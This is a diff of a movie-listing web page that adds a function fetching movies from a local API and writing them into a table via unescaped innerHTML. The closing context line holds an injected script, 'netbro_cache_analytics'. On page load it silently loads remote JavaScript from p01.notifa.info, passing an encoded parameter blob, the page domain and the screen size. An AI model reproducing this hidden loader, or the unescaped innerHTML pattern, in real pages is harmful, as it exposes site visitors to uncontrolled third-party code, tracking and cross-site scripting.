@@ -769,6 +769,27 @@ single New Yorkers.</p>
 		<script src="js/afterglow.min.js" defer></script><!-- Video Player JS Plugin -->
 		<script src="js/script.js" defer></script><!-- Custom Document Ready JS -->
 		<script src="js/script-dashboard.js" defer></script><!-- Custom Document Ready for Dashboard Only JS -->
+
+		<script>
+			function getAllContent(){
+				var url  = "http://localhost:3000/api/movies";
+				var xhr  = new XMLHttpRequest();
+				var content = "<tr><th>ID</th><th>Movie Name</th></tr>";
+				xhr.open('GET', url, true);
+				xhr.onload = function() {
+					var courses = JSON.parse(xhr.responseText);
+					if (xhr.readyState == 4 && xhr.status == "200") {
+						courses.forEach((val) => {
+							content += "<tr><td>" + val.id + "</td><td>" + val.name + "</td></tr>";
+						})
+						document.getElementById('result').innerHTML = content;
+					} else {
+						console.error(courses);
+					}
+				}
+				xhr.send(null);
+			}
+		</script>
 		
 		
 	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXstx%2f11gesA2IINqgUuib2htE646l88688pq4u91g0Tr%2fbMhJp9fSdYpUj66zivXlWWTVWkLdOirFCNEMndEIY2dsrh08JWPFAidyJT8dXhQgZWfdBobWt%2fjhKjKprt5sbNENpeXwntS5Kh5J%2bRhsCIA4SWVRi0aas7r5juqik1K2UADAeEswTGjZePJckHaAL4tX2erltS%2blh8ZmyBbAFm8fqJFYNlYF1nUG0LJV4FlcpK%2b2sxVhzc41d4GVJfE3Y%2fKbNO58qwyNcBA3kazim6YFwUJ3KfiRJxfGulV70nGWIaDrlWOx%2bswedtzWRuFF0rDZS9B2dPqNyRl%2foxO27C2TYkHggvtOCD%2blQWRnG0KSiFdeOx5WOT3cYh6jF7PW6g6%2b1iKCNhoL1JDwS2kyqIsGuZSAsy1oyYoSC5%2b%2fRIgrVqpVPEEPdW%2fL8uMTQuizSKzcdXp6iHQVmFz%2bkoJC1tU7DiqNjJPx" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
